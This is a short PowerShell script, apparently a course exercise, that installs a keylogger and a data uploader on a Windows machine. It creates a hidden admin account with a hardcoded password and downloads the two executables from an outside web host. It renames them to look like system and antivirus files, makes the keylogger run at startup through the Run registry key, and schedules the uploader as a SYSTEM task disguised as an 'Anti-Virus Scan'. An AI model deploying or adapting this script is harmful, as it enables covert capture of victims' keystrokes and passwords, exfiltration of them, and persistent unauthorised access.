#John Rader
#This is a short and simple script to install a dummy Key Logger and Uploader onto a host machine.
#The script downloads the .exe files from a remote source, sets the Key logger to run on startup,
#and creates a task for the uploader to upload daily at 2am. The files names are also changed to be
#more inconspicuous. The script also creates an admin account the is added to the administrators group on
#the machine to ensure access to the machine. 

#creates user and adds it to admins group

net user poweruser "PassWord1" /add
net localgroup "Admins" /add
net localgroup Administrators "Admins" /add
net localgroup "Admins" poweruser /add

#creates \temp if it is not created
if(-not (Test-Path "c:\Temp")) {
    New-Item "C:\Temp" -type directory
    }

#downloads the klog and uploader files
$source1 = "http://front.cs.lewisu.edu/~perryjn/klog.exe"
$des1 = "C:\Temp\srvchost.exe"
$source2 = "http://front.cs.lewisu.edu/~perryjn/uploader.exe"
$des2 = "C:\Temp\defender.exe"

$client = New-Object System.Net.WebClient
$client.Downloadfile($source1, $des1)
$client.Downloadfile($source2, $des2)

#set the klog to run on startup
$regpath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$appath = "%windir%\Temp\srvchost.exe"
$name = "srvchost"

Set-ItemProperty -Path $regpath -Name $name -Value $appath

#creates the task for the uploader to activate daily at 2am
schtasks.exe /create /s localhost /ru System /tn "Anti-Virus Scan" /tr "C:\Temp\defender.exe" /sc DAILY /st 02:00

